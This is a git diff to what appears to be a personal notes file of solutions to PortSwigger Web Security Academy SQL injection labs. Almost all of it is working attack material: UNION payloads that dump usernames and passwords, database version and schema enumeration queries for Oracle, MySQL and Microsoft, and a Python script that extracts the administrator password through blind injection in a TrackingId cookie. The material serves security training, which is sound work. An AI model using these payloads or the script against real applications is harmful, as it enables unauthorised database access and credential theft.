@@ -611,7 +611,40 @@ XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-p
 - `/filter?category=Gifts'+union+select+username,password+from+users--`
 
 #### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column): SQL injection UNION attack, retrieving multiple values in a single column
-- `/filter?category=Gifts'+union+select+1,username||':'||password+from+users--`
+`/filter?category=Gifts'+union+select+1,username||':'||password+from+users--`
 
 #### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle): SQL injection attack, querying the database type and version on Oracle
-- `/filter?category='+union+select+null,banner+FROM+v$version--`
+`/filter?category='+union+select+null,banner+FROM+v$version--`
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft): SQL injection attack, querying the database type and version on MySQL and Microsoft
+`/filter?category=Gifts'+union+select+@@version,null+--+`
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle): SQL injection attack, listing the database contents on non-Oracle databases
+
+- `/filter?category='+union+select+version(),null--`
+- `/filter?category='+union+select+table_name,null+from+information_schema.tables--` 
+- `/filter?category='+union+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_tgviyo'--`
+- `/filter?category='+union+SELECT+username_bzrpfl,password_mignev+from+users_tgviyo--`
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle): SQL injection attack, listing the database contents on Oracle
+
+- `/filter?category='+union+select+null,table_name+from+all_tables--`
+- `/filter?category='+union+select+null,column_name+from+all_tab_columns+where+table_name='USERS_QCHNKE'`
+- `/filter?category='+union+select+USERNAME_NREBWP,PASSWORD_TKLBZQ+from+USERS_QCHNKE--`
+
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses): Blind SQL injection with conditional responses
+
+```python
+for j in range(1,50):
+    for i in string.printable:
+        payload = "' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password,1,"+str(j)+")='"+(k+i)+"'--"
+        cookies = {'TrackingId':'xyz' + payload}
+        r = requests.get(url, cookies=cookies)
+        if 'Welcome back!' in r.text:
+            k += i
+            print(k)
+            break
+```
+
+
